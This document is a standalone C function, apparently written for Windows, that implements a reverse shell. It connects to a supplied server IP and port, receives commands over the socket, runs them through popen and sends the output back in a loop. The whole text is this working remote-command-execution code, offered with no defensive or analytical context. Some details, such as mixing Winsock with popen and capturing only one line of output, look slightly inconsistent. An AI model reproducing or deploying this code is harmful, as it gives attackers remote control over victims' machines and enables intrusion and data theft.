void reverseShell(char *serverIP, int serverPort) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in serverAddr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock\n");
        return;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        WSACleanup();
        return;
    }

    // Set up the server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIP);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    printf("Connected to server\n");

    char buffer[4096];
    while (1) {
        // Receive command from the server
        int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            break;
        }
        buffer[bytesReceived] = '\0';

        printf("Server: %s", buffer);  // Echo received command to console

        // Execute the command and send back the output
        FILE *cmdPipe;
        char result[4096];

        // Use system() call for simplicity. Not recommended for production.
        cmdPipe = popen(buffer, "r");
        if (cmdPipe != NULL) {
            fgets(result, sizeof(result), cmdPipe);
            pclose(cmdPipe);
        } else {
            strcpy(result, "Command execution failed.\n");
        }

        send(sock, result, strlen(result), 0);
    }

    printf("Disconnected\n");
    closesocket(sock);
    WSACleanup();
}

